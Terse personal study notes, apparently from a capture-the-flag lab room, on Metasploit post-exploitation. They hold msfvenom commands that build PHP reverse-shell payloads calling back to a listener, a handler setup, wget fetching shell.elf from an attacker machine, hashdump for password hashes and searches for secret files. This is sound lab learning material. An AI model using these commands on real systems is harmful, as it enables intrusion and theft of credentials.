---
tags:
  - Room
  - CyberNotes
---
meterpreter : Run on memory on target, we can interact with like shell by metasploit


meterpreter > `{shell icon} search -f flag.txt`
meterpreter > `{shell icon} cat c:\\Users\\Jon\\Documents\\flag.txt ` 

**hashdump** password hash


```shell-session
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```
```shell-session
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
```shell-session
use exploit/multi/handler 
```
python3 -m http.server 9000
wget http://ATTACKING_MA[[]]CHINE_IP:9000/shell.elf

```shell-session
use exploit/multi/handler 
set payload linux/x86/meterpreter/reverse_tcp
```

IPS (Intrusion Prevention System) and IDS (Intrusion Detection System)
 sysinfo on Windows
 NetBIOS domain using post/windows/gather/enum_domain
 search -f secrets.txt
 hashdump